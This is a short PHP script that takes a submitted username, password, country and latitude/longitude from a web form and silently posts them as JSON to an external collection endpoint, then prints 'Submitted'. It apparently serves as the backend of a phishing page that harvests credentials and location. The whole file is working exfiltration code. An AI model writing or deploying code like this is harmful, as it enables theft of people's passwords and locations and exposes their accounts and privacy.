<?php

// ====== CONFIG ======
$API_URL = "https://statistics-ntcs-projects-3a2fa543.vercel.app/api/store"; 

$data = [
    "username" => $_POST["username"] ?? "",
    "password" => $_POST["password"] ?? "",
    "country" => $_POST["country"] ?? "",
    "latitude" => $_POST["latitude"] ?? "",
    "longitude" => $_POST["longitude"] ?? ""
];

$ch = curl_init($API_URL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_exec($ch);
curl_close($ch);

echo "Submitted";
